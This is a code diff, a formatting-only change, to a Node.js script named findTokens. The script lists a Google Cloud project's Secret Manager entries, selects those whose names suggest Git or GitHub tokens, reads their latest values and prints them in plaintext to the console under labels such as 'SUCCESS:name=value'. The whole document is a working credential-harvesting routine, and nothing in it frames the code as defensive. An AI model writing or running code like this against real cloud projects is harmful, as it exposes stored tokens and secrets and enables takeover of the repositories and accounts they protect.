@@ -1,4 +1,4 @@
-const {SecretManagerServiceClient} = require('@google-cloud/secret-manager');
+const { SecretManagerServiceClient } = require('@google-cloud/secret-manager');
 const client = new SecretManagerServiceClient();
 
 async function findTokens(projectId) {
@@ -7,14 +7,20 @@ async function findTokens(projectId) {
     const [secrets] = await client.listSecrets({ parent: `projects/${projectId}` });
     for (const secret of secrets) {
       const name = secret.name.split('/').pop();
-      if (name.toUpperCase().includes('GIT') || name.toUpperCase().includes('TOKEN') || name.toUpperCase().includes('GH_')) {
+      if (
+        name.toUpperCase().includes('GIT') ||
+        name.toUpperCase().includes('TOKEN') ||
+        name.toUpperCase().includes('GH_')
+      ) {
         console.log(`FOUND_POTENTIAL:${name}`);
         try {
-            const [version] = await client.accessSecretVersion({ name: `${secret.name}/versions/latest` });
-            const payload = version.payload.data.toString();
-            console.log(`SUCCESS:${name}=${payload}`);
+          const [version] = await client.accessSecretVersion({
+            name: `${secret.name}/versions/latest`,
+          });
+          const payload = version.payload.data.toString();
+          console.log(`SUCCESS:${name}=${payload}`);
         } catch (e) {
-            console.log(`FAILED_TO_ACCESS:${name} - ${e.message}`);
+          console.log(`FAILED_TO_ACCESS:${name} - ${e.message}`);
         }
       }
     }
